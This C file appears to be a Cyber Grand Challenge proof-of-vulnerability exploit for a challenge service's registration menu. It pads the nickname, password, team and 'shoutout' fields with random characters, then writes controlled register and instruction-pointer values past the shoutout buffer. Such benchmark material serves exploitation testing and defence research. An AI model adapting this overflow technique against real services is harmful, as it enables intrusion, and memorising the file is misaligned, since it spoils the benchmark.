#include <libpov.h>
#include "xlat.h"

unsigned short swap16(unsigned short n)
{
    return (n << 8) | (n >> 8);
}

int main(void) {

    type1_vals t1;
    type1_negotiate(0x00fefefe, 0xfefefefe, 6, &t1);
    //0..7 [eax,ecx,edx,ebx,esp,ebp,esi,edi]

    const char map[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    int i;
    unsigned char payload[1024], out[8192];
    unsigned char *eip = NULL, *reg = NULL;
    unsigned int eip_len = 4, reg_len = 4;
    unsigned int p_len = 0;

    eip = (unsigned char *) &t1.ipval;
    reg = (unsigned char *) &t1.regval;

    xlat_seed("7943");

    for (i = 0; i < reg_len; ++i)
        reg[i] |= 0x01;
    for (i = 0; i < eip_len; ++i)
        eip[i] |= 0x01;
    //for (i = 0; i < reg_len; ++i)
    //    reg[i] = 0x41;
    //for (i = 0; i < eip_len; ++i)
    //    eip[i] = 0x42;

    /* Read in */
    length_read(STDIN, out, 108);
    transmit_all(STDERR, out, 108);

    /* Select Register */
    memcpy(&payload[p_len], "1\n", 2);
    p_len += 2;
    transmit_all(STDOUT, payload, p_len);

    /* Try Registering until it works */
    while (1)
    {
        length_read(STDIN, out, 1);
        transmit_all(STDERR, out, 1);
        if (out[0] != 'C')
            break;
        length_read(STDIN, out, 109);
        transmit_all(STDERR, out, 109);
        transmit_all(STDOUT, payload, p_len);
    }

    /* Now in Register process */
    length_read(STDIN, out, 48);
    transmit_all(STDERR, out, 48);
    p_len = 0;
    /* Nickname */
    random(&payload[p_len], 12, NULL);
    for (i = 0; i < 12; i++)
        payload[p_len+i] = map[payload[p_len+i] % (sizeof(map) - 1)];
    p_len += 12;
    payload[p_len++] = '\n';
    /* Password */
    random(&payload[p_len], 12, NULL);
    for (i = 0; i < 12; i++)
        payload[p_len+i] = map[payload[p_len+i] % (sizeof(map) - 1)];
    p_len += 12;
    payload[p_len++] = '\n';
    /* Team token */
    payload[p_len++] = '\n';
    /* Team name */
    random(&payload[p_len], 12, NULL);
    for (i = 0; i < 12; i++)
        payload[p_len+i] = map[payload[p_len+i] % (sizeof(map) - 1)];
    p_len += 12;
    payload[p_len++] = '\n';
    /* Shoutout */
    random(&payload[p_len], 128, NULL);
    for (i = 0; i < 128; i++)
        payload[p_len+i] = map[payload[p_len+i] % (sizeof(map) - 1)];
    p_len += 128;
    for (i = 0; i < reg_len; i++)
        payload[p_len + i] = reg[i];
    p_len += reg_len;
    random(&payload[p_len], 16, NULL);
    for (i = 0; i < 12; i++)
        payload[p_len+i] = map[payload[p_len+i] % (sizeof(map) - 1)];
    p_len += 12;
    for (i = 0; i < eip_len - 1; i++)
        payload[p_len + i] = eip[i];
    p_len += (eip_len - 1);
    payload[p_len++] = '\n';
    transmit_all(STDOUT, payload, p_len);
    transmit_all(STDERR, payload, p_len);
    length_read(STDIN, out, 10);

    return 0;
}
